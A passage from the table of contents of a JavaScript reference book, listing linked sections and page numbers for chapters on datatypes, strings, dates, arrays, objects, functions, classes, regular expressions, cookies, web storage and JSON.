[33](#chapter-6-datatypes-in-javascript)](#chapter-6-datatypes-in-javascript)

[Section 6.1: typeof [33](#section-6.1-typeof)](#section-6.1-typeof)

[Section 6.2: Finding an object&apos;s class
[34](#section-6.2-finding-an-objects-class)](#section-6.2-finding-an-objects-class)

[Section 6.3: Getting object type by constructor name
[34](#section-6.3-getting-object-type-by-constructor-name)](#section-6.3-getting-object-type-by-constructor-name)

[**Chapter 7: Strings** [37](#chapter-7-strings)](#chapter-7-strings)

[Section 7.1: Basic Info and String Concatenation
[37](#section-7.1-basic-info-and-string-concatenation)](#section-7.1-basic-info-and-string-concatenation)

[Section 7.2: Reverse String
[38](#section-7.2-reverse-string)](#section-7.2-reverse-string)

[Section 7.3: Comparing Strings Lexicographically
[39](#section-7.3-comparing-strings-lexicographically)](#section-7.3-comparing-strings-lexicographically)

[Section 7.4: Access character at index in string
[40](#section-7.4-access-character-at-index-in-string)](#section-7.4-access-character-at-index-in-string)

[Section 7.5: Escaping quotes
[40](#section-7.5-escaping-quotes)](#section-7.5-escaping-quotes)

[Section 7.6: Word Counter
[41](#section-7.6-word-counter)](#section-7.6-word-counter)

[Section 7.7: Trim whitespace
[41](#section-7.7-trim-whitespace)](#section-7.7-trim-whitespace)

[Section 7.8: Splitting a string into an array
[41](#section-7.8-splitting-a-string-into-an-array)](#section-7.8-splitting-a-string-into-an-array)

[Section 7.9: Strings are unicode
[42](#section-7.9-strings-are-unicode)](#section-7.9-strings-are-unicode)

[Section 7.10: Detecting a string
[42](#section-7.10-detecting-a-string)](#section-7.10-detecting-a-string)

[Section 7.11: Substrings with slice
[43](#section-7.11-substrings-with-slice)](#section-7.11-substrings-with-slice)

[Section 7.12: Character code
[43](#section-7.12-character-code)](#section-7.12-character-code)

[Section 7.13: String Representations of Numbers
[43](#section-7.13-string-representations-of-numbers)](#section-7.13-string-representations-of-numbers)

[Section 7.14: String Find and Replace Functions
[44](#section-7.14-string-find-and-replace-functions)](#section-7.14-string-find-and-replace-functions)

[Section 7.15: Find the index of a substring inside a string
[45](#section-7.15-find-the-index-of-a-substring-inside-a-string)](#section-7.15-find-the-index-of-a-substring-inside-a-string)

[Section 7.16: String to Upper Case
[45](#section-7.16-string-to-upper-case)](#section-7.16-string-to-upper-case)

[Section 7.17: String to Lower Case
[46](#section-7.17-string-to-lower-case)](#section-7.17-string-to-lower-case)

[Section 7.18: Repeat a String
[46](#section-7.18-repeat-a-string)](#section-7.18-repeat-a-string)

[**Chapter 8: Date** [47](#chapter-8-date)](#chapter-8-date)

[Section 8.1: Create a new Date object
[47](#section-8.1-create-a-new-date-object)](#section-8.1-create-a-new-date-object)

[Section 8.2: Convert to a string format
[49](#section-8.2-convert-to-a-string-format)](#section-8.2-convert-to-a-string-format)

[Section 8.3: Creating a Date from UTC
[50](#section-8.3-creating-a-date-from-utc)](#section-8.3-creating-a-date-from-utc)

[Section 8.4: Formatting a JavaScript date
[53](#section-8.4-formatting-a-javascript-date)](#section-8.4-formatting-a-javascript-date)

[Section 8.5: Get the number of milliseconds elapsed since 1 January
1970 00:00:00 UTC
[55](#section-8.5-get-the-number-of-milliseconds-elapsed-since-1-january-1970-000000-utc)](#section-8.5-get-the-number-of-milliseconds-elapsed-since-1-january-1970-000000-utc)

[Section 8.6: Get the current time and date
[55](#section-8.6-get-the-current-time-and-date)](#section-8.6-get-the-current-time-and-date)

[Section 8.7: Increment a Date Object
[56](#section-8.7-increment-a-date-object)](#section-8.7-increment-a-date-object)

[Section 8.8: Convert to JSON
[57](#section-8.8-convert-to-json)](#section-8.8-convert-to-json)

[**Chapter 9: Date Comparison**
[58](#chapter-9-date-comparison)](#chapter-9-date-comparison)

[Section 9.1: Comparing Date values
[58](#section-9.1-comparing-date-values)](#section-9.1-comparing-date-values)

[Section 9.2: Date Dierence Calculation
[59](#section-9.2-date-dierence-calculation)](#section-9.2-date-dierence-calculation)

[**Chapter 10: Comparison Operations**
[60](#chapter-10-comparison-operations)](#chapter-10-comparison-operations)

[Section 10.1: Abstract equality / inequality and type conversion
[60](#section-10.1-abstract-equality-inequality-and-type-conversion)](#section-10.1-abstract-equality-inequality-and-type-conversion)

[Section 10.2: NaN Property of the Global Object
[61](#section-10.2-nan-property-of-the-global-object)](#section-10.2-nan-property-of-the-global-object)

[Section 10.3: Short-circuiting in boolean operators
[63](#section-10.3-short-circuiting-in-boolean-operators)](#section-10.3-short-circuiting-in-boolean-operators)

[Section 10.4: Null and Undefined
[65](#section-10.4-null-and-undefined)](#section-10.4-null-and-undefined)

[Section 10.5: Abstract Equality (==)
[65](#section-10.5-abstract-equality)](#section-10.5-abstract-equality)

[Section 10.6: Logic Operators with Booleans
[66](#section-10.6-logic-operators-with-booleans)](#section-10.6-logic-operators-with-booleans)

[Section 10.7: Automatic Type Conversions
[67](#section-10.7-automatic-type-conversions)](#section-10.7-automatic-type-conversions)

[Section 10.8: Logic Operators with Non-boolean values (boolean
coercion)
[67](#section-10.8-logic-operators-with-non-boolean-values-boolean-coercion)](#section-10.8-logic-operators-with-non-boolean-values-boolean-coercion)

[Section 10.9: Empty Array
[68](#section-10.9-empty-array)](#section-10.9-empty-array)

[Section 10.10: Equality comparison operations
[68](#section-10.10-equality-comparison-operations)](#section-10.10-equality-comparison-operations)

[Section 10.11: Relational operators (&lt;, &lt;=, &gt;, &gt;=)
[70](#section-10.11-relational-operators)](#section-10.11-relational-operators)

[Section 10.12: Inequality
[71](#section-10.12-inequality)](#section-10.12-inequality)

[Section 10.13: List of Comparison Operators
[72](#section-10.13-list-of-comparison-operators)](#section-10.13-list-of-comparison-operators)

[Section 10.14: Grouping multiple logic statements
[72](#section-10.14-grouping-multiple-logic-statements)](#section-10.14-grouping-multiple-logic-statements)

[Section 10.15: Bit fields to optimise comparison of multi state data
[72](#section-10.15-bit-fields-to-optimise-comparison-of-multi-state-data)](#section-10.15-bit-fields-to-optimise-comparison-of-multi-state-data)

[**Chapter 11: Conditions**
[74](#chapter-11-conditions)](#chapter-11-conditions)

[Section 11.1: Ternary operators
[74](#section-11.1-ternary-operators)](#section-11.1-ternary-operators)

[Section 11.2: Switch statement
[75](#section-11.2-switch-statement)](#section-11.2-switch-statement)

[Section 11.3: If / Else If / Else Control
[77](#section-11.3-if-else-if-else-control)](#section-11.3-if-else-if-else-control)

[Section 11.4: Strategy
[78](#section-11.4-strategy)](#section-11.4-strategy)

[Section 11.5: Using &vert;&vert; and && short circuiting
[79](#section-11.5-using-and-short-circuiting)](#section-11.5-using-and-short-circuiting)

[**Chapter 12: Arrays** [80](#chapter-12-arrays)](#chapter-12-arrays)

[Section 12.1: Converting Array-like Objects to Arrays
[80](#section-12.1-converting-array-like-objects-to-arrays)](#section-12.1-converting-array-like-objects-to-arrays)

[Section 12.2: Reducing values
[82](#section-12.2-reducing-values)](#section-12.2-reducing-values)

[Section 12.3: Mapping values
[84](#section-12.3-mapping-values)](#section-12.3-mapping-values)

[Section 12.4: Filtering Object Arrays
[84](#section-12.4-filtering-object-arrays)](#section-12.4-filtering-object-arrays)

[Section 12.5: Sorting Arrays
[86](#section-12.5-sorting-arrays)](#section-12.5-sorting-arrays)

[Section 12.6: Iteration
[88](#section-12.6-iteration)](#section-12.6-iteration)

[Section 12.7: Destructuring an array
[92](#section-12.7-destructuring-an-array)](#section-12.7-destructuring-an-array)

[Section 12.8: Removing duplicate elements
[93](#section-12.8-removing-duplicate-elements)](#section-12.8-removing-duplicate-elements)

[Section 12.9: Array comparison
[93](#section-12.9-array-comparison)](#section-12.9-array-comparison)

[Section 12.10: Reversing arrays
[94](#section-12.10-reversing-arrays)](#section-12.10-reversing-arrays)

[Section 12.11: Shallow cloning an array
[95](#section-12.11-shallow-cloning-an-array)](#section-12.11-shallow-cloning-an-array)

[Section 12.12: Concatenating Arrays
[95](#section-12.12-concatenating-arrays)](#section-12.12-concatenating-arrays)

[Section 12.13: Merge two array as key value pair
[97](#section-12.13-merge-two-array-as-key-value-pair)](#section-12.13-merge-two-array-as-key-value-pair)

[Section 12.14: Array spread / rest
[97](#section-12.14-array-spread-rest)](#section-12.14-array-spread-rest)

[Section 12.15: Filtering values
[98](#section-12.15-filtering-values)](#section-12.15-filtering-values)

[Section 12.16: Searching an Array
[99](#section-12.16-searching-an-array)](#section-12.16-searching-an-array)

[Section 12.17: Convert a String to an Array
[100](#section-12.17-convert-a-string-to-an-array)](#section-12.17-convert-a-string-to-an-array)

[Section 12.18: Removing items from an array
[100](#section-12.18-removing-items-from-an-array)](#section-12.18-removing-items-from-an-array)

[Section 12.19: Removing all elements
[101](#section-12.19-removing-all-elements)](#section-12.19-removing-all-elements)

[Section 12.20: Finding the minimum or maximum element
[102](#section-12.20-finding-the-minimum-or-maximum-element)](#section-12.20-finding-the-minimum-or-maximum-element)

[Section 12.21: Standard array initialization
[103](#section-12.21-standard-array-initialization)](#section-12.21-standard-array-initialization)

[Section 12.22: Joining array elements in a string
[104](#section-12.22-joining-array-elements-in-a-string)](#section-12.22-joining-array-elements-in-a-string)

[Section 12.23: Removing/Adding elements using splice()
[105](#section-12.23-removingadding-elements-using-splice)](#section-12.23-removingadding-elements-using-splice)

[Section 12.24: The entries() method
[105](#section-12.24-the-entries-method)](#section-12.24-the-entries-method)

[Section 12.25: Remove value from array
[105](#section-12.25-remove-value-from-array)](#section-12.25-remove-value-from-array)

[Section 12.26: Flattening Arrays
[106](#section-12.26-flattening-arrays)](#section-12.26-flattening-arrays)

[Section 12.27: Append / Prepend items to Array
[107](#section-12.27-append-prepend-items-to-array)](#section-12.27-append-prepend-items-to-array)

[Section 12.28: Object keys and values to array
[107](#section-12.28-object-keys-and-values-to-array)](#section-12.28-object-keys-and-values-to-array)

[Section 12.29: Logical connective of values
[108](#section-12.29-logical-connective-of-values)](#section-12.29-logical-connective-of-values)

[Section 12.30: Checking if an object is an Array
[108](#section-12.30-checking-if-an-object-is-an-array)](#section-12.30-checking-if-an-object-is-an-array)

[Section 12.31: Insert an item into an array at a specific index
[109](#section-12.31-insert-an-item-into-an-array-at-a-specific-index)](#section-12.31-insert-an-item-into-an-array-at-a-specific-index)

[Section 12.32: Sorting multidimensional array
[109](#section-12.32-sorting-multidimensional-array)](#section-12.32-sorting-multidimensional-array)

[Section 12.33: Test all array items for equality
[110](#section-12.33-test-all-array-items-for-equality)](#section-12.33-test-all-array-items-for-equality)

[Section 12.34: Copy part of an Array
[110](#section-12.34-copy-part-of-an-array)](#section-12.34-copy-part-of-an-array)

[**Chapter 13: Objects**
[112](#chapter-13-objects)](#chapter-13-objects)

[Section 13.1: Shallow cloning
[112](#section-13.1-shallow-cloning)](#section-13.1-shallow-cloning)

[Section 13.2: Object.freeze
[112](#section-13.2-object.freeze)](#section-13.2-object.freeze)

[Section 13.3: Object cloning
[113](#section-13.3-object-cloning)](#section-13.3-object-cloning)

[Section 13.4: Object properties iteration
[114](#section-13.4-object-properties-iteration)](#section-13.4-object-properties-iteration)

[Section 13.5: Object.assign
[115](#section-13.5-object.assign)](#section-13.5-object.assign)

[Section 13.6: Object rest/spread (&hellip;)
[116](#section-13.6-object-restspread-...)](#section-13.6-object-restspread-...)

[Section 13.7: Object.defineProperty
[116](#section-13.7-object.defineproperty)](#section-13.7-object.defineproperty)

[Section 13.8: Accesor properties (get and set)
[117](#section-13.8-accesor-properties-get-and-set)](#section-13.8-accesor-properties-get-and-set)

[Section 13.9: Dynamic / variable property names
[117](#section-13.9-dynamic-variable-property-names)](#section-13.9-dynamic-variable-property-names)

[Section 13.10: Arrays are Objects
[118](#section-13.10-arrays-are-objects)](#section-13.10-arrays-are-objects)

[Section 13.11: Object.seal
[119](#section-13.11-object.seal)](#section-13.11-object.seal)

[Section 13.12: Convert object&apos;s values to array
[120](#section-13.12-convert-objects-values-to-array)](#section-13.12-convert-objects-values-to-array)

[Section 13.13: Retrieving properties from an object
[120](#section-13.13-retrieving-properties-from-an-object)](#section-13.13-retrieving-properties-from-an-object)

[Section 13.14: Read-Only property
[123](#section-13.14-read-only-property)](#section-13.14-read-only-property)

[Section 13.15: Non enumerable property
[123](#section-13.15-non-enumerable-property)](#section-13.15-non-enumerable-property)

[Section 13.16: Lock property description
[123](#section-13.16-lock-property-description)](#section-13.16-lock-property-description)

[Section 13.17: Object.getOwnPropertyDescriptor
[124](#section-13.17-object.getownpropertydescriptor)](#section-13.17-object.getownpropertydescriptor)

[Section 13.18: Descriptors and Named Properties
[124](#section-13.18-descriptors-and-named-properties)](#section-13.18-descriptors-and-named-properties)

[Section 13.19: Object.keys
[126](#section-13.19-object.keys)](#section-13.19-object.keys)

[Section 13.20: Properties with special characters or reserved words
[126](#section-13.20-properties-with-special-characters-or-reserved-words)](#section-13.20-properties-with-special-characters-or-reserved-words)

[Section 13.21: Creating an Iterable object
[127](#section-13.21-creating-an-iterable-object)](#section-13.21-creating-an-iterable-object)

[Section 13.22: Iterating over Object entries - Object.entries()
[127](#section-13.22-iterating-over-object-entriesobject.entries)](#section-13.22-iterating-over-object-entriesobject.entries)

[Section 13.23: Object.values()
[128](#section-13.23-object.values)](#section-13.23-object.values)

[**Chapter 14: Arithmetic (Math)**
[129](#chapter-14-arithmetic-math)](#chapter-14-arithmetic-math)

[Section 14.1: Constants
[129](#section-14.1-constants)](#section-14.1-constants)

[Section 14.2: Remainder / Modulus (%)
[129](#section-14.2-remainder-modulus)](#section-14.2-remainder-modulus)

[Section 14.3: Rounding
[130](#section-14.3-rounding)](#section-14.3-rounding)

[Section 14.4: Trigonometry
[132](#section-14.4-trigonometry)](#section-14.4-trigonometry)

[Section 14.5: Bitwise operators
[133](#section-14.5-bitwise-operators)](#section-14.5-bitwise-operators)

[Section 14.6: Incrementing (++)
[135](#section-14.6-incrementing)](#section-14.6-incrementing)

[Section 14.7: Exponentiation (Math.pow() or &ast;&ast;)
[135](#section-14.7-exponentiation-math.pow-or)](#section-14.7-exponentiation-math.pow-or)

[Section 14.8: Random Integers and Floats
[136](#section-14.8-random-integers-and-floats)](#section-14.8-random-integers-and-floats)

[Section 14.9: Addition (+)
[137](#section-14.9-addition)](#section-14.9-addition)

[Section 14.10: Little / Big endian for typed arrays when using bitwise
operators
[137](#section-14.10-little-big-endian-for-typed-arrays-when-using-bitwise-operators)](#section-14.10-little-big-endian-for-typed-arrays-when-using-bitwise-operators)

[Section 14.11: Get Random Between Two Numbers
[138](#section-14.11-get-random-between-two-numbers)](#section-14.11-get-random-between-two-numbers)

[Section 14.12: Simulating events with dierent probabilities
[139](#section-14.12-simulating-events-with-dierent-probabilities)](#section-14.12-simulating-events-with-dierent-probabilities)

[Section 14.13: Subtraction (-)
[140](#section-14.13-subtraction)](#section-14.13-subtraction)

[Section 14.14: Multiplication (&ast;)
[140](#section-14.14-multiplication)](#section-14.14-multiplication)

[Section 14.15: Getting maximum and minimum
[140](#section-14.15-getting-maximum-and-minimum)](#section-14.15-getting-maximum-and-minimum)

[Section 14.16: Restrict Number to Min/Max Range
[141](#section-14.16-restrict-number-to-minmax-range)](#section-14.16-restrict-number-to-minmax-range)

[Section 14.17: Ceiling and Floor
[141](#section-14.17-ceiling-and-floor)](#section-14.17-ceiling-and-floor)

[Section 14.18: Getting roots of a number
[142](#section-14.18-getting-roots-of-a-number)](#section-14.18-getting-roots-of-a-number)

[Section 14.19: Random with gaussian distribution
[142](#section-14.19-random-with-gaussian-distribution)](#section-14.19-random-with-gaussian-distribution)

[Section 14.20: Math.atan2 to find direction
[143](#section-14.20-math.atan2-to-find-direction)](#section-14.20-math.atan2-to-find-direction)

[Section 14.21: Sin & Cos to create a vector given direction & distance
[143](#section-14.21-sin-cos-to-create-a-vector-given-direction-distance)](#section-14.21-sin-cos-to-create-a-vector-given-direction-distance)

[Section 14.22: Math.hypot
[144](#section-14.22-math.hypot)](#section-14.22-math.hypot)

[Section 14.23: Periodic functions using Math.sin
[145](#section-14.23-periodic-functions-using-math.sin)](#section-14.23-periodic-functions-using-math.sin)

[Section 14.24: Division (/)
[146](#section-14.24-division)](#section-14.24-division)

[Section 14.25: Decrementing (&rpar;
[146](#section-14.25-decrementing)](#section-14.25-decrementing)

[**Chapter 15: Bitwise operators**
[148](#chapter-15-bitwise-operators)](#chapter-15-bitwise-operators)

[Section 15.1: Bitwise operators
[148](#section-15.1-bitwise-operators)](#section-15.1-bitwise-operators)

[Section 15.2: Shift Operators
[150](#section-15.2-shift-operators)](#section-15.2-shift-operators)

[**Chapter 16: Constructor functions**
[151](#chapter-16-constructor-functions)](#chapter-16-constructor-functions)

[Section 16.1: Declaring a constructor function
[151](#section-16.1-declaring-a-constructor-function)](#section-16.1-declaring-a-constructor-function)

[**Chapter 17: Declarations and Assignments**
[152](#chapter-17-declarations-and-assignments)](#chapter-17-declarations-and-assignments)

[Section 17.1: Modifying constants
[152](#section-17.1-modifying-constants)](#section-17.1-modifying-constants)

[Section 17.2: Declaring and initializing constants
[152](#section-17.2-declaring-and-initializing-constants)](#section-17.2-declaring-and-initializing-constants)

[Section 17.3: Declaration
[152](#section-17.3-declaration)](#section-17.3-declaration)

[Section 17.4: Undefined
[153](#section-17.4-undefined)](#section-17.4-undefined)

[Section 17.5: Data Types
[153](#section-17.5-data-types)](#section-17.5-data-types)

[Section 17.6: Mathematic operations and assignment
[153](#section-17.6-mathematic-operations-and-assignment)](#section-17.6-mathematic-operations-and-assignment)

[Section 17.7: Assignment
[155](#section-17.7-assignment)](#section-17.7-assignment)

[**Chapter 18: Loops** [156](#chapter-18-loops)](#chapter-18-loops)

[Section 18.1: Standard &quot;for&quot; loops
[156](#section-18.1-standard-for-loops)](#section-18.1-standard-for-loops)

[Section 18.2: &quot;for &hellip; of&quot; loop
[157](#section-18.2-for-...-of-loop)](#section-18.2-for-...-of-loop)

[Section 18.3: &quot;for &hellip; in&quot; loop
[159](#section-18.3-for-...-in-loop)](#section-18.3-for-...-in-loop)

[Section 18.4: &quot;while&quot; Loops
[159](#section-18.4-while-loops)](#section-18.4-while-loops)

[Section 18.5: &quot;continue&quot; a loop
[160](#section-18.5-continue-a-loop)](#section-18.5-continue-a-loop)

[Section 18.6: Break specific nested loops
[161](#section-18.6-break-specific-nested-loops)](#section-18.6-break-specific-nested-loops)

[Section 18.7: &quot;do &hellip; while&quot; loop
[161](#section-18.7-do-...-while-loop)](#section-18.7-do-...-while-loop)

[Section 18.8: Break and continue labels
[161](#section-18.8-break-and-continue-labels)](#section-18.8-break-and-continue-labels)

[**Chapter 19: Functions**
[163](#chapter-19-functions)](#chapter-19-functions)

[Section 19.1: Function Scoping
[163](#section-19.1-function-scoping)](#section-19.1-function-scoping)

[Section 19.2: Currying
[164](#section-19.2-currying)](#section-19.2-currying)

[Section 19.3: Immediately Invoked Function Expressions
[165](#section-19.3-immediately-invoked-function-expressions)](#section-19.3-immediately-invoked-function-expressions)

[Section 19.4: Named Functions
[166](#section-19.4-named-functions)](#section-19.4-named-functions)

[Section 19.5: Binding &grave;this&grave; and arguments
[169](#section-19.5-binding-this-and-arguments)](#section-19.5-binding-this-and-arguments)

[Section 19.6: Functions with an Unknown Number of Arguments (variadic
functions)
[171](#section-19.6-functions-with-an-unknown-number-of-arguments-variadic-functions)](#section-19.6-functions-with-an-unknown-number-of-arguments-variadic-functions)

[Section 19.7: Anonymous Function
[172](#section-19.7-anonymous-function)](#section-19.7-anonymous-function)

[Section 19.8: Default parameters
[174](#section-19.8-default-parameters)](#section-19.8-default-parameters)

[Section 19.9: Call and apply
[176](#section-19.9-call-and-apply)](#section-19.9-call-and-apply)

[Section 19.10: Partial Application
[177](#section-19.10-partial-application)](#section-19.10-partial-application)

[Section 19.11: Passing arguments by reference or value
[178](#section-19.11-passing-arguments-by-reference-or-value)](#section-19.11-passing-arguments-by-reference-or-value)

[Section 19.12: Function Arguments, &quot;arguments&quot; object, rest and
spread parameters
[179](#section-19.12-function-arguments-arguments-object-rest-and-spread-parameters)](#section-19.12-function-arguments-arguments-object-rest-and-spread-parameters)

[Section 19.13: Function Composition
[179](#section-19.13-function-composition)](#section-19.13-function-composition)

[Section 19.14: Get the name of a function object
[180](#section-19.14-get-the-name-of-a-function-object)](#section-19.14-get-the-name-of-a-function-object)

[Section 19.15: Recursive Function
[180](#section-19.15-recursive-function)](#section-19.15-recursive-function)

[Section 19.16: Using the Return Statement
[181](#section-19.16-using-the-return-statement)](#section-19.16-using-the-return-statement)

[Section 19.17: Functions as a variable
[182](#section-19.17-functions-as-a-variable)](#section-19.17-functions-as-a-variable)

[**Chapter 20: Functional JavaScript**
[185](#chapter-20-functional-javascript)](#chapter-20-functional-javascript)

[Section 20.1: Higher-Order Functions
[185](#section-20.1-higher-order-functions)](#section-20.1-higher-order-functions)

[Section 20.2: Identity Monad
[185](#section-20.2-identity-monad)](#section-20.2-identity-monad)

[Section 20.3: Pure Functions
[187](#section-20.3-pure-functions)](#section-20.3-pure-functions)

[Section 20.4: Accepting Functions as Arguments
[188](#section-20.4-accepting-functions-as-arguments)](#section-20.4-accepting-functions-as-arguments)

[**Chapter 21: Prototypes, objects**
[190](#chapter-21-prototypes-objects)](#chapter-21-prototypes-objects)

[Section 21.1: Creation and initialising Prototype
[190](#section-21.1-creation-and-initialising-prototype)](#section-21.1-creation-and-initialising-prototype)

[**Chapter 22: Classes**
[192](#chapter-22-classes)](#chapter-22-classes)

[Section 22.1: Class Constructor
[192](#section-22.1-class-constructor)](#section-22.1-class-constructor)

[Section 22.2: Class Inheritance
[192](#section-22.2-class-inheritance)](#section-22.2-class-inheritance)

[Section 22.3: Static Methods
[193](#section-22.3-static-methods)](#section-22.3-static-methods)

[Section 22.4: Getters and Setters
[193](#section-22.4-getters-and-setters)](#section-22.4-getters-and-setters)

[Section 22.5: Private Members
[194](#section-22.5-private-members)](#section-22.5-private-members)

[Section 22.6: Methods
[195](#section-22.6-methods)](#section-22.6-methods)

[Section 22.7: Dynamic Method Names
[195](#section-22.7-dynamic-method-names)](#section-22.7-dynamic-method-names)

[Section 22.8: Managing Private Data with Classes
[196](#section-22.8-managing-private-data-with-classes)](#section-22.8-managing-private-data-with-classes)

[Section 22.9: Class Name binding
[198](#section-22.9-class-name-binding)](#section-22.9-class-name-binding)

[**Chapter 23: Namespacing**
[199](#chapter-23-namespacing)](#chapter-23-namespacing)

[Section 23.1: Namespace by direct assignment
[199](#section-23.1-namespace-by-direct-assignment)](#section-23.1-namespace-by-direct-assignment)

[Section 23.2: Nested Namespaces
[199](#section-23.2-nested-namespaces)](#section-23.2-nested-namespaces)

[**Chapter 24: Context (this)**
[200](#chapter-24-context-this)](#chapter-24-context-this)

[Section 24.1: this with simple objects
[200](#section-24.1-this-with-simple-objects)](#section-24.1-this-with-simple-objects)

[Section 24.2: Saving this for use in nested functions / objects
[200](#section-24.2-saving-this-for-use-in-nested-functions-objects)](#section-24.2-saving-this-for-use-in-nested-functions-objects)

[Section 24.3: Binding function context
[201](#section-24.3-binding-function-context)](#section-24.3-binding-function-context)

[Section 24.4: this in constructor functions
[202](#section-24.4-this-in-constructor-functions)](#section-24.4-this-in-constructor-functions)

[**Chapter 25: Setters and Getters**
[203](#chapter-25-setters-and-getters)](#chapter-25-setters-and-getters)

[Section 25.1: Defining a Setter/Getter Using Object.defineProperty
[203](#section-25.1-defining-a-settergetter-using-object.defineproperty)](#section-25.1-defining-a-settergetter-using-object.defineproperty)

[Section 25.2: Defining an Setter/Getter in a Newly Created Object
[203](#section-25.2-defining-an-settergetter-in-a-newly-created-object)](#section-25.2-defining-an-settergetter-in-a-newly-created-object)

[Section 25.3: Defining getters and setters in ES6 class
[203](#section-25.3-defining-getters-and-setters-in-es6-class)](#section-25.3-defining-getters-and-setters-in-es6-class)

[**Chapter 26: Events** [205](#chapter-26-events)](#chapter-26-events)

[Section 26.1: Page, DOM and Browser loading
[205](#section-26.1-page-dom-and-browser-loading)](#section-26.1-page-dom-and-browser-loading)

[**Chapter 27: Inheritance**
[206](#chapter-27-inheritance)](#chapter-27-inheritance)

[Section 27.1: Standard function prototype
[206](#section-27.1-standard-function-prototype)](#section-27.1-standard-function-prototype)

[Section 27.2: Dierence between Object.key and Object.prototype.key
[206](#section-27.2-dierence-between-object.key-and-object.prototype.key)](#section-27.2-dierence-between-object.key-and-object.prototype.key)

[Section 27.3: Prototypal inheritance
[206](#section-27.3-prototypal-inheritance)](#section-27.3-prototypal-inheritance)

[Section 27.4: Pseudo-classical inheritance
[207](#section-27.4-pseudo-classical-inheritance)](#section-27.4-pseudo-classical-inheritance)

[Section 27.5: Setting an Object&apos;s prototype
[208](#section-27.5-setting-an-objects-prototype)](#section-27.5-setting-an-objects-prototype)

[**Chapter 28: Method Chaining**
[210](#chapter-28-method-chaining)](#chapter-28-method-chaining)

[Section 28.1: Chainable object design and chaining
[210](#section-28.1-chainable-object-design-and-chaining)](#section-28.1-chainable-object-design-and-chaining)

[Section 28.2: Method Chaining
[212](#section-28.2-method-chaining)](#section-28.2-method-chaining)

[**Chapter 29: Callbacks**
[213](#chapter-29-callbacks)](#chapter-29-callbacks)

[Section 29.1: Simple Callback Usage Examples
[213](#section-29.1-simple-callback-usage-examples)](#section-29.1-simple-callback-usage-examples)

[Section 29.2: Continuation (synchronous and asynchronous)
[214](#section-29.2-continuation-synchronous-and-asynchronous)](#section-29.2-continuation-synchronous-and-asynchronous)

[Section 29.3: What is a callback?
[215](#section-29.3-what-is-a-callback)](#section-29.3-what-is-a-callback)

[Section 29.4: Callbacks and &grave;this&grave;
[216](#section-29.4-callbacks-and-this)](#section-29.4-callbacks-and-this)

[Section 29.5: Callback using Arrow function
[217](#section-29.5-callback-using-arrow-function)](#section-29.5-callback-using-arrow-function)

[Section 29.6: Error handling and control-flow branching
[218](#section-29.6-error-handling-and-control-flow-branching)](#section-29.6-error-handling-and-control-flow-branching)

[**Chapter 30: Intervals and Timeouts**
[219](#chapter-30-intervals-and-timeouts)](#chapter-30-intervals-and-timeouts)

[Section 30.1: Recursive setTimeout
[219](#section-30.1-recursive-settimeout)](#section-30.1-recursive-settimeout)

[Section 30.2: Intervals
[219](#section-30.2-intervals)](#section-30.2-intervals)

[Section 30.3: Intervals
[219](#section-30.3-intervals)](#section-30.3-intervals)

[Section 30.4: Removing intervals
[220](#section-30.4-removing-intervals)](#section-30.4-removing-intervals)

[Section 30.5: Removing timeouts
[220](#section-30.5-removing-timeouts)](#section-30.5-removing-timeouts)

[Section 30.6: setTimeout, order of operations, clearTimeout
[220](#section-30.6-settimeout-order-of-operations-cleartimeout)](#section-30.6-settimeout-order-of-operations-cleartimeout)

[**Chapter 31: Regular expressions**
[222](#chapter-31-regular-expressions)](#chapter-31-regular-expressions)

[Section 31.1: Creating a RegExp Object
[222](#section-31.1-creating-a-regexp-object)](#section-31.1-creating-a-regexp-object)

[Section 31.2: RegExp Flags
[222](#section-31.2-regexp-flags)](#section-31.2-regexp-flags)

[Section 31.3: Check if string contains pattern using .test()
[223](#section-31.3-check-if-string-contains-pattern-using-.test)](#section-31.3-check-if-string-contains-pattern-using-.test)

[Section 31.4: Matching With .exec()
[223](#section-31.4-matching-with-.exec)](#section-31.4-matching-with-.exec)

[Section 31.5: Using RegExp With Strings
[223](#section-31.5-using-regexp-with-strings)](#section-31.5-using-regexp-with-strings)

[Section 31.6: RegExp Groups
[224](#section-31.6-regexp-groups)](#section-31.6-regexp-groups)

[Section 31.7: Replacing string match with a callback function
[225](#section-31.7-replacing-string-match-with-a-callback-function)](#section-31.7-replacing-string-match-with-a-callback-function)

[Section 31.8: Using Regex.exec() with parentheses regex to extract
matches of a string
[226](#section-31.8-using-regex.exec-with-parentheses-regex-to-extract-matches-of-a-string)](#section-31.8-using-regex.exec-with-parentheses-regex-to-extract-matches-of-a-string)

[**Chapter 32: Cookies**
[228](#chapter-32-cookies)](#chapter-32-cookies)

[Section 32.1: Test if cookies are enabled
[228](#section-32.1-test-if-cookies-are-enabled)](#section-32.1-test-if-cookies-are-enabled)

[Section 32.2: Adding and Setting Cookies
[228](#section-32.2-adding-and-setting-cookies)](#section-32.2-adding-and-setting-cookies)

[Section 32.3: Reading cookies
[228](#section-32.3-reading-cookies)](#section-32.3-reading-cookies)

[Section 32.4: Removing cookies
[228](#section-32.4-removing-cookies)](#section-32.4-removing-cookies)

[**Chapter 33: Web Storage**
[229](#chapter-33-web-storage)](#chapter-33-web-storage)

[Section 33.1: Using localStorage
[229](#section-33.1-using-localstorage)](#section-33.1-using-localstorage)

[Section 33.2: Simpler way of handling Storage
[229](#section-33.2-simpler-way-of-handling-storage)](#section-33.2-simpler-way-of-handling-storage)

[Section 33.3: Storage events
[230](#section-33.3-storage-events)](#section-33.3-storage-events)

[Section 33.4: sessionStorage
[231](#section-33.4-sessionstorage)](#section-33.4-sessionstorage)

[Section 33.5: localStorage length
[232](#section-33.5-localstorage-length)](#section-33.5-localstorage-length)

[Section 33.6: Error conditions
[232](#section-33.6-error-conditions)](#section-33.6-error-conditions)

[Section 33.7: Clearing storage
[232](#section-33.7-clearing-storage)](#section-33.7-clearing-storage)

[Section 33.8: Remove Storage Item
[232](#section-33.8-remove-storage-item)](#section-33.8-remove-storage-item)

[**Chapter 34: Data attributes**
[233](#chapter-34-data-attributes)](#chapter-34-data-attributes)

[Section 34.1: Accessing data attributes
[233](#section-34.1-accessing-data-attributes)](#section-34.1-accessing-data-attributes)

[**Chapter 35: JSON** [234](#chapter-35-json)](#chapter-35-json)

[Section 35.1: JSON versus JavaScript literals
[234](#section-35.1-json-versus-javascript-literals)](#section-35.1-json-versus-javascript-literals)

[Section 35.2: Parsing with a reviver function
[235](#section-35.2-parsing-with-a-reviver-function)](#section-35.2-parsing-with-a-reviver-function)

[Section 35.3: Serializing a value
[236](#section-35.3-serializing-a-value)](#section-35.3-serializing-a-value)

[Section 35.4: Serializing and restoring class instances
